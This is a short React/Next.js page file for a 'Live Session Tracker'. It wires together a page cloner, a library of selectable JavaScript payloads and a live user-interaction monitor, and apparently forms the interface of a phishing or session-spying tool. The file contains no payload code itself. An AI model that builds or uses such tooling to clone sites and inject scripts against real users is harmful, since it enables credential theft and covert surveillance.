
'use client';

import { useState } from 'react';
import { LiveTracker } from '@/components/live-tracker';
import { AdvancedPageCloner } from '@/components/advanced-page-cloner';
import { JavaScriptLibrary, type JsPayload } from '@/components/javascript-library';
import { Separator } from '@/components/ui/separator';

export default function LiveTrackerPage() {
  const [selectedPayload, setSelectedPayload] = useState<JsPayload | null>(null);

  const handleSelectPayload = (payload: JsPayload) => {
    setSelectedPayload(payload);
  }

  return (
    <div className="flex flex-col gap-6">
      <div>
        <h1 className="font-headline text-3xl font-semibold">Live Session Tracker</h1>
        <p className="text-muted-foreground">Inject JS payloads and monitor real-time user interactions.</p>
      </div>

      <AdvancedPageCloner selectedPayload={selectedPayload}/>

      <Separator className="my-4" />
      
      <LiveTracker />

      <Separator className="my-4" />
      
      <JavaScriptLibrary onSelectPayload={handleSelectPayload}/>

    </div>
  );
}
